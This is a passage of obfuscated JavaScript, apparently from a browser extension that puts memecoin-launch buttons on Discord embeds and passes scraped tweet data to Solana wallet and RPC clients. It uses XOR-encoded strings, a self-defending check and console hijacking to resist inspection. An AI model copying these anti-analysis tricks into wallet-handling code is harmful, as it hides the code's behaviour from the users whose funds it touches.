              return $e.sZhdt(n[e(538)], 1)
                ? n[0].toUpperCase()
                : n
                    .map((t) => {
                      var e;
                      return (
                        (null == (e = t[0]) ? void 0 : e.toUpperCase()) || ""
                      );
                    })
                    .join("");
            })(n);
          an(r, o, i), e.empty(), (tn[t(Pe)][t(Oe)] = t(459));
        });
      const on = () => {
          const t = Qe,
            e = document[t(et) + t(nt)]($e.yZqwG);
          for (let n = 0; n < e.length; ++n) sn(e[n]);
        },
        sn = (t) => {
          const e = Qe;
          if (t[e(H) + "tor"]($e[e(Z)])) return;
          if (!t[e(X) + "tor"]("a.embedTitle__623de")) return;
          const n = (() => {
            const t = Qe,
              e = document.createElement("style");
            (e.textContent =
              t(it) +
              t(st) +
              "n-btn {\n  " +
              t(at) +
              "margin-left: 8px;\n  " +
              t(ut) +
              t(ct) +
              "0px 18px;\n            font-size: 14px;\n " +
              t(502) +
              t(lt) +
              "ht: 600;\n           " +
              t(dt) +
              "ointer;\n            " +
              t(ft) +
              "ne;\n      " +
              t(ht) +
              "er-radius:" +
              t(566) +
              "        ba" +
              t(515) +
              t(pt) +
              "dient(135d" +
              t(412) +
              ", 43, 150, 1) 0%, rg" +
              t(mt) +
              ", 199, 1) 50%, rgba(" +
              t(gt) +
              "255, 1) 10" +
              t(yt) +
              t(427) +
              "kground-size: 400% 400%;\n     " +
              t(wt) +
              "or: #f0f0f0;\n            transition: all" +
              t(bt) +
              t(vt) +
              t(At) +
              "-spacing: " +
              t(kt) +
              "         text-shadow: 0 1px 2px rgba(0,0,0,0.8);\n " +
              t(at) +
              " position:" +
              t(It) +
              t(St) +
              t(_t) +
              t(Tt) +
              "nt-border 5s ease in" +
              t(Bt) +
              t(ut) +
              t(Ct) +
              ";\n        }\n        " +
              t(Et) +
              t(st) +
              t(400) +
              "ore {\n            co" +
              t(549) +
              "\n         " +
              t(xt) +
              "n: absolut" +
              t(Pt) +
              t(Ot) +
              "3px;\n            lef" +
              t(Rt) +
              t(Mt) +
              "right: 3px" +
              t(vt) +
              "    bottom: 3px;\n            b" +
              t(Lt) +
              " linear-gradient(135deg, #3a3a" +
              t(Nt) +
              "4a4a 100%);\n            border" +
              t(Dt) +
              t(Ut) +
              t(qt) +
              t(zt) +
              "          " +
              t(Kt) +
              "w: 0 3px 1" +
              t(438) +
              t(Wt) +
              t(Ft) +
              t(jt) +
              "255,255,255,0.1);\n        }\n  " +
              t(Gt) +
              "     @keyframes grad" +
              t(435) +
              "r {\n      " +
              t(Vt) +
              " background-position: 0% 50%; " +
              t(Ht) +
              "    50% { " +
              t(Zt) +
              "-position: 100% 50%;" +
              t(Xt) +
              "     100% " +
              t(Jt) +
              "nd-positio" +
              t(Yt) +
              t(480) +
              t(Qt) +
              t(446) +
              t(556) +
              "create-coin-btn {\n          position: ab" +
              t($t) +
              "        z-" +
              t(te) +
              "9;\n       " +
              t(ee) +
              ": 10px 18px;\n          border-radius: 8px;\n          backgro" +
              t(ne) +
              "r-gradient" +
              t(re) +
              "2a2a2a 0%, #3a3a3a 100%);\n          color: #f0f0f0;\n          border: " +
              t(oe) +
              t(ie) +
              "      cursor: pointer;\n       " +
              t(467) +
              t(se) +
              "        font-family: inherit;\n          letter-spacing: 0.3p" +
              t(ae) +
              t(ue) +
              "ze: 14px;\n" +
              t(ce) +
              "font-weigh" +
              t(le) +
              t(de) +
              t(fe) +
              t(521) +
              "-50%);\n          transition: all 0.3s ease;\n          box-shadow: 0 4px 12px rgb" +
              t(he) +
              "4), inset " +
              t(pe) +
              "ba(255,255,255,0.1);\n         " +
              t(453) +
              "ow: 0 1px 2px rgba(0" +
              t(395) +
              "\n         " +
              t(me) +
              "filter: bl" +
              t(ge) +
              "        }\n        .floating-create-coin-btn:hover {\n        " +
              t(ye) +
              "nd: linear-gradient(135deg, #3a3a3a 0%, #2a2a2a 10" +
              t(we) +
              "     border-color: #" +
              t(be) +
              "     trans" +
              t(449) +
              "slateX(-50" +
              t(ve) +
              "teY(-2px);" +
              t(500) +
              " box-shadow: 0 6px 1" +
              t(Ae) +
              ",0,0,0.5)," +
              t(494) +
              "px 0 rgba(" +
              t(523) +
              t(ke) +
              t(Ie) +
              "     "),
              document.head[t(Se) + "d"](e);
            const n = {};
            return (
              (n[t(_e)] = $e[t(516)]),
              (n.textContent = $e[t(463)]),
              Object.assign(document.createElement(t(432)), n)
            );
          })();
          n[e(J) + "stener"]($e[e(Y)], (n) => {
            n["preventDef" + e(tt)](), n.stopPropagation(), an(t);
          }),
            uy(t);
          (t[e(H) + e(Q)]($e[e($)]) || t).appendChild(n);
        },
        an = async (t, e = "", n = "") => {
          var r;
          const o = Qe;
          try {
            const i = t["querySelec" + o(A)]($e.ZIeVs);
            if (!i) return;
            const s = Yg.getInstance();
            if (!s.isUserAuthenticated()) {
              if (!(await $e.CfFKw(gy, () => s.isUserAuthenticated() === !![])))
                return x(null), void 0;
            }
            if (!s[o(430)]()) {
              if (!(await $e.eUycx(gy, () => s.hasToken() === !![])))
                return $e.EOBGH(x, null), void 0;
            }
            let a = ((t, e = "", n = "", r) => {
              const o = Qe,
                i = [],
                s = [],
                a = Qg.getInstance().getSettings(),
                u = t.querySelector("div.embedA" + o(B) + "de"),
                c = t.querySelectorAll($e.gEwUa),
                l =
                  null == u
                    ? void 0
                    : u[o(383) + "tor"]("img.embedAuthorIcon__623de"),
                d = !!t.querySelector('a[href*="t' + o(402) + o(458) + o(C)),
                f = [
                  ...Array.from(c)[o(E)]((t) => t[o(421)]),
                  ...((null == l ? void 0 : l.src) ? [l[o(P)]] : []),
                ];
              try {
                const e = t.querySelectorAll("a[href]"),
                  n = r.href,
                  a = new Set(Array[o(O)](c)[o(E)]((t) => t.href)),
                  u = new Set();
                for (const t of Array[o(R)](e)) {
                  const e = t.href;
                  !e ||
                    $e.SKHne(e, n) ||
                    a[o(M)](e) ||
                    e.includes($e[o(L)]) ||
                    e[o(N) + "e"]().startsWith("https://t.co/") ||
                    u[o(D)](e.toLowerCase()) ||
                    (u.add(e.toLowerCase()),
                    e.startsWith($e[o(U)]) || e.startsWith($e[o(q)])
                      ? i[o(z)](e)
                      : s.push(e));
                }
              } catch (h) {
                $e[o(K)],
                  h instanceof Error
                    ? h.message
                    : typeof h === o(387) ||
                      (h && "object" == typeof h && JSON[o(W)](h));
              }
              return {
                coinName: e || "",
                ticker: $e.yUuho(n, ""),
                initialLiquidity:
                  (null == a ? void 0 : a.defaultSol[o(F)]()) || "1",
                twitterUrl: d ? r.href : "",
                websiteUrl: d ? "" : r[o(j)],
                additionalTweets: $e[o(G)](i.length, 0) ? i : void 0,
                additionalWebsites: $e.ccccI(s[o(V)], 0) ? s : void 0,
                images: f.filter(Boolean),
                selectedImage: f[0] || "",
              };
            })(t, e, n, i);
            !a && (a = $e.eUycx(yy, t));
            const u = $g[o(k) + "e"]();
            if (u.hasWallet()) {
              const t = u[o(I)]();
              await (null == (r = Lg.getRpcClient())
                ? void 0
                : r["getCachedB" + o(S)](null == t ? void 0 : t.publicKey));
            }
            await VO(s["getConnect" + o(_)]()), x(a);
          } catch (i) {
            $e[o(493)](i, Error)
              ? i[o(T)]
              : typeof i === $e.WpVzZ ||
                (i && "object" == typeof i && JSON[o(537)](i)),
              x(null);
          }
        };
      $e.YBODz(() => {
        const t = Qe,
          e = new MutationObserver(on),
          n = { childList: !![] };
        (n[t(394)] = !![]),
          e.observe(document.body, n),
          document["addEventLi" + t(rt)](t(ot) + "Loaded", on);
      });
    },
  });
  const dR = yR;
  function fR() {
    const t = [
      "zNHNAhq",
      "Aw4Gzgf0ysbWCG",
      "DvrStxu",
      "B1vNDha",
      "Aw9UigzHAwXLza",
      "mJiYnJiYmKXtsgDyCa",
      "r2PTvge",
      "EeTSA0y",
      "ChvIBgLJs2v5",
      "nKfrv2LwDW",
      "mwntq1fPtW",
      "tL9gt1jn",
      "BwvZC2fNzq",
      "sw52ywXPzcbJBW",
      "zw50AwnHDgvK",
      "mZeXotC0mhn3CfLLvq",
      "z2PntwO",
      "q29PBIbJCMvHDa",
      "y29UC3rYDwn0BW",
      "C3rYAw5NAwz5",
      "zxjYB3i",
      "mZjkzgfYyxe",
      "DgvvC2vY",
      "rxjNtMS",
      "Aw5NCW",
      "zuTeze0",
      "ENjiq0u",
      "s0vztem",
      "z2v0uNbJq2XPzq",
      "wfzswvu",
      "B2jQzwn0",
      "DwLKAxr5",
      "DLHxrwu",
      "u2furKu",
      "mtK2nteZowzqBLHdyq",
      "vMHIsM8",
      "zevwq0y",
      "ywrKCMvZCW",
      "qvvusf9vu0vsxW",
      "Bg9N",
      "qMPTrfa",
      "ChjVDg90ExbL",
      "wLjfs1e",
      "vef6vgW",
      "wevLBMm",
      "ExnnwMy",
      "mti0nZiXnwLYzKTtra",
      "t2HAv0u",
      "uMzrv00",
      "y3rLza",
      "yMLUza",
      "uunJt0u",
      "mta2ndu2n1L2v3HZvW",
      "vKLwtK4",
      "zgf0yq",
      "CNbJtw9Kzq",
      "DerKyu0",
      "tNLODKm",
      "Cvnjvw4",
      "CgfYyw1Z",
      "Bg9NB3v0",
      "DgfIBgu",
      "z3nqvey",
      "D2fPDezVCKXVyq",
      "u0vuveLor1nFra",
      "oti4odG4s21cA1fw",
      "AxnvC2vYqxv0Aa",
      "tKvdvf9srvfvrq",
      "vw5RBM93BIbLCG",
      "B2vxz0K",
      "A3L6sgq",
      "t2jqEeK",
      "ugLAEMO",
      "zgvywgW",
      "u25Xt3e",
      "B3nPv08",
      "z2v0qwrKCMvZCW",
      "yMLvA0O",
      "refuqq",
      "DhLWzq",
      "z2v0sw5ZDgfUyW",
      "Dg9tDhjPBMC",
      "DfvxChi",
      "AgXoD3G",
      "mtGXmtu2AfDMtMr1",
      "C3rLBMvY",
      "zgvJB2rL",
      "zNzvDxi",
      "uLbdx0Dfvf9cqq",
      "DMLOuMW",
      "C2vSzwn0zwrnBW",
      "D2j4Au8",
      "y3rVCIGICMv0Dq",
      "vLL5rgG",
      "BgXYtLa",
      "uuzSBhm",
      "C3rYAw5N",
      "ou1OCvv0vW",
      "BgvUz3rO",
      "Bwv0Ag9K",
      "zu5NBxG",
      "B3b3Bgq",
      "qvzuwMC",
      "z0z1t2K",
    ];
    return (fR = function () {
      return t;
    })();
  }
  !(function (t) {
    const e = 447,
      n = 434,
      r = 506,
      o = 475,
      i = 459,
      s = 488,
      a = yR,
      u = t();
    for (; []; )
      try {
        if (
          306775 ===
          (-parseInt(a(464)) / 1) * (-parseInt(a(415)) / 2) +
            (parseInt(a(e)) / 3) * (-parseInt(a(n)) / 4) +
            (-parseInt(a(500)) / 5) * (parseInt(a(463)) / 6) +
            (-parseInt(a(r)) / 7) * (-parseInt(a(o)) / 8) +
            -parseInt(a(i)) / 9 +
            -parseInt(a(469)) / 10 +
            parseInt(a(s)) / 11
        )
          break;
        u.push(u.shift());
      } catch (c) {
        u.push(u.shift());
      }
  })(fR);
  const hR = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    pR = hR(void 0, function () {
      const t = 431,
        e = 472,
        n = yR;
      return pR[n(t)]()
        .search("(((.+)+)+)+$")
        [n(t)]()
        [n(e) + "r"](pR)
        .search("(((.+)+)+)+$");
    });
  pR();
  const mR = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    gR = mR(void 0, function () {
      const t = 510,
        e = 451,
        n = 442,
        r = 496,
        o = 515,
        i = 493,
        s = 439,
        a = 422,
        u = 512,
        c = 495,
        l = 504,
        d = yR,
        f = {
          QFlls: function (t, e) {
            return t + e;
          },
        };
      (f[d(t)] = "return (function() "),
        (f[d(e)] = "{}.constru" + d(n) + 'rn this")( )'),
        (f[d(r)] = "warn"),
        (f.vihRl = "info"),
        (f.PiZzj = "exception"),
        (f.qSIUn = d(o));
      const h = f;
      let p;
      try {
        p = Function(h[d(445)](h[d(t)] + h[d(e)], ");"))();
      } catch (y) {
        p = window;
      }
      const m = (p.console = p.console || {}),
        g = [d(i), h.ZREKQ, h[d(s)], "error", h[d(a)], h[d(u)], "trace"];
      for (let w = 0; w < g.length; w++) {
        const t = mR[d(472) + "r"][d(c)][d(l)](mR),
          e = g[w],
          n = m[e] || t;
        (t.__proto__ = mR[d(l)](mR)),
          (t.toString = n.toString[d(504)](n)),
          (m[e] = t);
      }
    });
  function yR(t, e) {
    const n = fR();
    return (
      (yR = function (e, r) {
        let o = n[(e -= 415)];
        if (void 0 === yR.zBiVRN) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (yR.aZicFx = i), (t = arguments), (yR.zBiVRN = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.EZBsgl = t),
              (this.KHrsdj = [1, 0, 0]),
              (this.DyfxVZ = function () {
                return "newState";
              }),
              (this.zRVQZe = "\\w+ *\\(\\) *{\\w+ *"),
              (this.izvLdp = "['|\"].+['|\"];? *}");
          };
          (e.prototype.zTHVHo = function () {
            const t = new RegExp(this.zRVQZe + this.izvLdp).test(
              this.DyfxVZ.toString()
            )
              ? --this.KHrsdj[1]
              : --this.KHrsdj[0];
            return this.SWPIIe(t);
          }),
            (e.prototype.SWPIIe = function (t) {
              return Boolean(~t) ? this.iuEghl(this.EZBsgl) : t;
            }),
            (e.prototype.iuEghl = function (t) {
              for (let e = 0, n = this.KHrsdj.length; e < n; e++)
                this.KHrsdj.push(Math.round(Math.random())),
                  (n = this.KHrsdj.length);
              return t(this.KHrsdj[0]);
            }),
            new e(yR).zTHVHo(),
            (o = yR.aZicFx(o)),
            (t[s] = o);
        }
        return o;
      }),
      yR(t, e)
    );
  }
  gR(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const wR = () => {
      const t = 508,
        e = 429,
        n = function (t, e) {
          return t(e);
        };
      window["addEventLi" + yR(435)]("message", async (r) => {
        const o = yR,
          i = r[o(t)],
          s = AR[i[o(e)]];
        s && n(s, i);
      });
    },
    bR = async (t) => {
      const e = 458,
        n = 485,
        r = 467,
        o = 455,
        i = 509,
        s = 433,
        a = 441,
        u = 473,
        c = 436,
        l = 436,
        d = 450,
        f = 448,
        h = 448,
        p = 481,
        m = 444,
        g = 460,
        y = yR,
        w = {
          yfuyR: function (t, e) {
            return t ^ e;
          },
          AVTZg: function (t, e) {
            return t < e;
          },
          jWhug: function (t, e) {
            return t >>> e;
          },
          zrHCE: function (t, e) {
            return t * e;
          },
          mEJKC: function (t, e) {
            return t % e;
          },
          DnUpd: function (t, e) {
            return t & e;
          },
          tUWpr: function (t, e) {
            return t >>> e;
          },
          ErWZa: function (t, e) {
            return t ^ e;
          },
          eNgmx: function (t, e) {
            return t * e;
          },
          qtDDN: function (t, e) {
            return t % e;
          },
          uoNsM: function (t, e) {
            return t & e;
          },
          XVRYU: function (t, e) {
            return t * e;
          },
          pxVKe: function (t, e) {
            return t ^ e;
          },
          VYyDh: function (t, e) {
            return t(e);
          },
          hlNwx: y(471) + y(e),
          wbxiO: function (t, e) {
            return t === e;
          },
          zfZmT: y(446),
        };
      t.data["initialLiq" + y(n)].replace(/,/g, ".");
      const b = Yg[y(430) + "e"]();
      if (
        t.type ===
        (function () {
          const t = 460,
            e = 436,
            n = y,
            r = {};
          (r[n(m)] = function (t, e) {
            return t < e;
          }),
            (r[n(470)] = function (t, e) {
              return t * e;
            }),
            (r[n(g)] = function (t, e) {
              return t % e;
            });
          const o = r;
          let i;
          return function () {
            const r = n;
            if (!i) {
              const n = new Uint8Array([
                  69, 224, 16, 127, 82, 247, 10, 125, 73, 251, 27, 97, 53, 234,
                ]),
                s = 1045803526,
                a = new Uint8Array(n.length);
              for (let e = 0; o.llrNP(e, n.length); e++) {
                const i = (s >>> o.gjMMj(o[r(t)](e, 4), 8)) & 255;
                a[e] = n[e] ^ i;
              }
              i = new TextDecoder()[r(e)](a);
            }
            return i;
          };
        })()()
      )
        return (
          P({
            type: (function () {
              let t;
              return function () {
                const e = yR;
                if (!t) {
                  const n = new Uint8Array([
                      67, 253, 28, 112, 95, 241, 7, 123, 65, 230, 16, 97, 70,
                      243, 28, 114,
                    ]),
                    r = 1045803520,
                    o = new Uint8Array(n[e(448)]);
                  for (let t = 0; t < n.length; t++) {
                    const e = (r >>> ((t % 4) * 8)) & 255;
                    o[t] = n[t] ^ e;
                  }
                  t = new TextDecoder().decode(o);
                }
                return t;
              };
            })()(),
            detail: (function () {
              const t = {
                ObPxI: function (t, e) {
                  return t % e;
                },
                KEYLC: function (t, e) {
                  return w.yfuyR(t, e);
                },
              };
              let e;
              return function () {
                const n = yR;
                if (!e) {
                  const r = new Uint8Array([
                      75, 199, 57, 74, 111, 146, 49, 91, 118, 222, 58, 71, 38,
                      197, 60, 82, 106, 146, 55, 91, 38, 209, 58, 83, 111, 220,
                      50, 30, 117, 221, 58, 80, 39,
                    ]),
                    o = 1045803526,
                    i = new Uint8Array(r.length);
                  for (let e = 0; e < r[n(h)]; e++) {
                    const s = (o >>> (8 * t[n(421)](e, 4))) & 255;
                    i[e] = t[n(p)](r[e], s);
                  }
                  e = new TextDecoder().decode(i);
                }
                return e;
              };
            })()(),
          }),
          ![]
        );
      if (!b[y(416) + "enticated"]())
        return (
          w.VYyDh(P, {
            type: (function () {
              const t = 448,
                e = 480,
                n = 436;
              let r;
              return function () {
                const o = yR;
                if (!r) {
                  const i = new Uint8Array([
                      71, 253, 28, 112, 91, 241, 7, 123, 69, 230, 16, 97, 66,
                      243, 28, 114,
                    ]),
                    s = 1045803524,
                    a = new Uint8Array(i.length);
                  for (let n = 0; w.AVTZg(n, i[o(t)]); n++) {
                    const t = 255 & w.jWhug(s, w[o(e)](n % 4, 8));
                    a[n] = w.yfuyR(i[n], t);
                  }
                  r = new TextDecoder()[o(n)](a);
                }
                return r;
              };
            })()(),
            detail: (function () {
              const t = function (t, e) {
                  return t & e;
                },
                e = function (t, e) {
                  return w.mEJKC(t, e);
                };
              let n;
              return function () {
                const r = yR;
                if (!n) {
                  const o = new Uint8Array([
                      83, 193, 48, 76, 38, 211, 32, 74, 110, 215, 59, 74, 111,
                      209, 52, 74, 111, 221, 59, 30, 96, 211, 60, 82, 99, 214,
                      116,
                    ]),
                    i = 1045803526,
                    s = new Uint8Array(o[r(f)]);
                  for (let n = 0; n < o.length; n++) {
                    const r = t(i >>> (8 * e(n, 4)), 255);
                    s[n] = o[n] ^ r;
                  }
                  n = new TextDecoder().decode(s);
                }
                return n;
              };
            })()(),
          }),
          ![]
        );
      const v = ey.validateCoinData(t.data);
      if (!v)
        return (
          P({
            type: (function () {
              const t = 448;
              let e;
              return function () {
                const n = yR;
                if (!e) {
                  const r = new Uint8Array([
                      75, 253, 28, 112, 87, 241, 7, 123, 73, 230, 16, 97, 78,
                      243, 28, 114,
                    ]),
                    o = 1045803528,
                    i = new Uint8Array(r[n(t)]);
                  for (let t = 0; w.AVTZg(t, r.length); t++) {
                    const e = w.DnUpd(w.tUWpr(o, (t % 4) * 8), 255);
                    i[t] = w.ErWZa(r[t], e);
                  }
                  e = new TextDecoder().decode(i);
                }
                return e;
              };
            })()(),
            detail: y(r) + y(o) + "ovided",
          }),
          ![]
        );
      const A = Qg.getInstance().getSettings();
      try {
        if ("mogtechRPC" === (null == A ? void 0 : A[y(440) + "de"])) {
          const { msg: t, success: e } = await (async (t, e, n) => {
            const r = 508,
              o = 540,
              i = 566,
              s = 568,
              a = 591,
              u = 588,
              c = 601,
              l = 522,
              d = 494,
              f = zO,
              h = {
                iKgRB: "Failed to " + f(493) + f(r),
                Eroru: function (t, e) {
                  return t === e;
                },
                UoCtK: f(o),
                wgYGq: function (t, e, n) {
                  return t(e, n);
                },
                rkOIZ: function (t, e) {
                  return t === e;
                },
              };
            try {
              if (!Qg.getInstance()[f(i) + "s"]()) {
                const t = {};
                return (t[f(522)] = h[f(514)]), (t.success = ![]), t;
              }
              if (h.Eroru(n, h[f(s)])) {
                const { msg: n, success: r } = await h[f(a)](Cy, t, e),
                  o = {};
                return (o.msg = n), (o.success = r), o;
              }
              {
                const { msg: n, success: r } = await h[f(591)](HP, t, e),
                  o = {};
                return (o.msg = n), (o[f(494)] = r), o;
              }
            } catch (p) {
              let t = f(u) + f(c);
              p instanceof Error
                ? (t = p.message)
                : h.rkOIZ(typeof p, "string")
                ? (t = p)
                : p && "object" == typeof p && (t = JSON.stringify(p));
              const e = {};
              return (e[f(l)] = "" + t), (e[f(d)] = ![]), e;
            }
          })(v, ![], A.rpcMode);
          return (
            P(
              e
                ? {
                    type: (function () {
                      const t = 427,
                        e = 436,
                        n = {
                          biUkJ: function (t, e) {
                            return w.DnUpd(t, e);
                          },
                          HEgbF: function (t, e) {
                            return w[yR(d)](t, e);
                          },
                          wLUNj: function (t, e) {
                            return w.qtDDN(t, e);
                          },
                        };
                      let r;
                      return function () {
                        const o = yR;
                        if (!r) {
                          const i = new Uint8Array([
                              69, 224, 16, 127, 82, 247, 10, 125, 73, 251, 27,
                              97, 85, 231, 22, 125, 67, 225, 6,
                            ]),
                            s = 1045803526,
                            a = new Uint8Array(i.length);
                          for (let e = 0; e < i.length; e++) {
                            const r = n[o(t)](
                              s >>> n.HEgbF(n.wLUNj(e, 4), 8),
                              255
                            );
                            a[e] = i[e] ^ r;
                          }
                          r = new TextDecoder()[o(e)](a);
                        }
                        return r;
                      };
                    })()(),
                  }
                : {
                    type: (function () {
                      const t = 448,
                        e = 452,
                        n = 483;
                      let r;
                      return function () {
                        const o = yR;
                        if (!r) {
                          const i = new Uint8Array([
                              71, 253, 28, 112, 91, 241, 7, 123, 69, 230, 16,
                              97, 66, 243, 28, 114,
                            ]),
                            s = 1045803524,
                            a = new Uint8Array(i[o(t)]);
                          for (let t = 0; w[o(e)](t, i.length); t++) {
                            const e = w.uoNsM(s >>> w[o(n)](t % 4, 8), 255);
                            a[t] = w.ErWZa(i[t], e);
                          }
                          r = new TextDecoder().decode(a);
                        }
                        return r;
                      };
                    })()(),
                    detail: t,
                  }
            ),
            e
          );
        }
        {
          const { msg: t, success: e } = await (async (t, e) => {
            const n = 494,
              r = 531,
              o = 522,
              i = 534,
              s = 538,
              a = 583,
              u = zO,
              c = {
                RwfiE: u(540),
                CbfHO: function (t, e) {
                  return t(e);
                },
                gDtHg: function (t, e) {
                  return t(e);
                },
                JYlMN: function (t, e) {
                  return t === e;
                },
                XgqkB: function (t, e) {
                  return t === e;
                },
              };
            try {
              if (e === c[u(574)]) {
                const { msg: e, success: r } = await c.CbfHO(UO, t),
                  o = {};
                return (o.msg = e), (o[u(n)] = r), o;
              }
              {
                const { msg: e, success: n } = await c[u(r)](qO, t),
                  i = {};
                return (i[u(o)] = e), (i.success = n), i;
              }
            } catch (l) {
              let t = "Unknown error";
              l instanceof Error
                ? (t = l[u(i)])
                : c[u(s)](typeof l, u(a))
                ? (t = l)
                : l && c[u(541)](typeof l, "object") && (t = JSON.stringify(l));
              const e = {};
              return (e.msg = "" + t), (e.success = ![]), e;
            }
          })(v, null == A ? void 0 : A[y(i)]);
          return (
            P(
              e
                ? {
                    type: (function () {
                      let t;
                      return function () {
                        if (!t) {
                          const e = new Uint8Array([
                              69, 224, 16, 127, 82, 247, 10, 125, 73, 251, 27,
                              97, 85, 231, 22, 125, 67, 225, 6,
                            ]),
                            n = 1045803526,
                            r = new Uint8Array(e.length);
                          for (let t = 0; t < e.length; t++) {
                            const o = (n >>> ((t % 4) * 8)) & 255;
                            r[t] = e[t] ^ o;
                          }
                          t = new TextDecoder().decode(r);
                        }
                        return t;
                      };
                    })()(),
                  }
                : {
                    type: (function () {
                      let t;
                      return function () {
                        const e = yR;
                        if (!t) {
                          const n = new Uint8Array([
                              67, 253, 28, 112, 95, 241, 7, 123, 65, 230, 16,
                              97, 70, 243, 28, 114,
                            ]),
                            r = 1045803520,
                            o = new Uint8Array(n.length);
                          for (let t = 0; t < n[e(448)]; t++) {
                            const i = 255 & w[e(432)](r, (t % 4) * 8);
                            o[t] = n[t] ^ i;
                          }
                          t = new TextDecoder()[e(l)](o);
                        }
                        return t;
                      };
                    })()(),
                    detail: t,
                  }
            ),
            e
          );
        }
      } catch (k) {
        let t = w[y(s)];
        return (
          k instanceof Error
            ? (t = k.message)
            : w[y(a)](typeof k, w.zfZmT)
            ? (t = k)
            : k && typeof k === y(484) && (t = JSON[y(u)](k)),
          w[y(443)](P, {
            type: (function () {
              let t;
              return function () {
                const e = yR;
                if (!t) {
                  const n = new Uint8Array([
                      69, 253, 28, 112, 89, 241, 7, 123, 71, 230, 16, 97, 64,
                      243, 28, 114,
                    ]),
                    r = 1045803526,
                    o = new Uint8Array(n.length);
                  for (let t = 0; t < n.length; t++) {
                    const e = 255 & w.tUWpr(r, (t % 4) * 8);
                    o[t] = w.pxVKe(n[t], e);
                  }
                  t = new TextDecoder()[e(c)](o);
                }
                return t;
              };
            })()(),
            detail: t,
          }),
          ![]
        );
      }
    },
    vR = {
      IFRAME_READY: async (t) => {
        var e;
        const n = 487,
          r = 482,
          o = 462,
          i = 499,
          s = 477,
          a = yR,
          u = {
            eKDdM: function (t, e) {
              return t >>> e;
            },
            osiWO: function (t, e) {
              return t ^ e;
            },
            SaTFE: function (t, e) {
              return t(e);
            },
            vXWEe: function (t, e) {
              return t(e);
            },
          },
          c = $g.getInstance();
        await c.waitForLoad();
        const l = c.getWallet();
        l &&
          (u[a(n)](P, {
            type: (function () {
              const t = 457,
                e = 479,
                n = {
                  eWEsj: function (t, n) {
                    return u[yR(e)](t, n);
                  },
                  oUgtp: function (t, e) {
                    return t ^ e;
                  },
                };
              let r;
              return function () {
                const e = yR;
                if (!r) {
                  const o = new Uint8Array([
                      81, 243, 25, 114, 67, 230, 10, 125, 73, 252, 27, 123, 69,
                      230, 16, 122,
                    ]),
                    i = 1045803526,
                    s = new Uint8Array(o.length);
                  for (let r = 0; r < o.length; r++) {
                    const a = 255 & n.eWEsj(i, (r % 4) * 8);
                    s[r] = n[e(t)](o[r], a);
                  }
                  r = new TextDecoder().decode(s);
                }
                return r;
              };
            })()(),
            address: c.getAddress(),
            publicKey: c.getAddress(),
          }),
          await (null == (e = Lg[a(r) + "nt"]())
            ? void 0
            : e.getBalance(l[a(o)]))),
          u[a(486)](P, {
            type: (function () {
              const t = {
                ysMZf: function (t, e) {
                  return u.eKDdM(t, e);
                },
                ErgNk: function (t, e) {
                  return u[yR(425)](t, e);
                },
              };
              let e;
              return function () {
                const n = yR;
                if (!e) {
                  const r = new Uint8Array([
                      65, 234, 1, 123, 74, 225, 28, 113, 74, 237, 7, 123, 69,
                      246, 12,
                    ]),
                    o = 1045803524,
                    a = new Uint8Array(r.length);
                  for (let e = 0; e < r.length; e++) {
                    const u = 255 & t[n(i)](o, (e % 4) * 8);
                    a[e] = t[n(s)](r[e], u);
                  }
                  e = new TextDecoder().decode(a);
                }
                return e;
              };
            })()(),
          });
      },
    };
  (vR["CREATE_COI" + dR(465)] = bR),
    (vR.CREATE_COIN = bR),
    (vR.CREATE_COIN_3X = bR),
    (vR[dR(492) + dR(428)] = async (t) => {
      const e = 430,
        n = 476,
        r = 514,
        o = yR,
        i = {
          wKZnI: function (t, e) {
            return t * e;
          },
          MJgpS: o(474),
          xqyud: function (t) {
            return t();
          },
        },
        s = Yg[o(e) + "e"](),
        a = Qg.getInstance(),
        u = await s["authentica" + o(n)](t.user);
      if (!u)
        return (
          xg(
            (function () {
              const t = function (t, e) {
                  return t < e;
                },
                e = function (t, e) {
                  return t & e;
                },
                n = function (t, e) {
                  return i.wKZnI(t, e);
                };
              let r;
              return function () {
                if (!r) {
                  const o = new Uint8Array([
                      69, 199, 33, 86, 97, 220, 33, 87, 103, 211, 33, 87, 107,
                      220, 117, 88, 101, 219, 57, 91, 96, 147, 117, 114, 107,
                      213, 50, 87, 106, 213, 117, 81, 113, 198, 123,
                    ]),
                    i = 1045803524,
                    s = new Uint8Array(o.length);
                  for (let r = 0; t(r, o.length); r++) {
                    const t = e(i >>> n(r % 4, 8), 255);
                    s[r] = o[r] ^ t;
                  }
                  r = new TextDecoder().decode(s);
                }
                return r;
              };
            })()(),
            i.MJgpS
          ),
          i.xqyud(C),
          s[o(r)](),
          void 0
        );
      u && a.getSettings();
    }),
    (vR[dR(518) + "ATA"] = (t) => {
      const e = 430,
        n = 508,
        r = 416,
        o = 430,
        i = 478,
        s = 423,
        a = 473,
        u = yR,
        c = {
          bBXcj: function (t) {
            return t();
          },
          deXXl: "object",
        };
      try {
        const s = Yg[u(e) + "e"]();
        if (
          (t[u(n)].defaultSol[u(431)]().replace(/,/g, "."), !s[u(r) + u(468)]())
        )
          return;
        const a = Qg[u(o) + "e"]();
        a["updateSett" + u(i)](t.data) &&
          (c.bBXcj(cy),
          (() => {
            const t = 445,
              e = 380,
              n = iR,
              r = document[n(383) + n(t)](
                n(e) + "ntainer__623de > div.grid__623de"
              );
            for (let o = 0; o < r.length; ++o) uy(r[o]);
          })());
      } catch (l) {
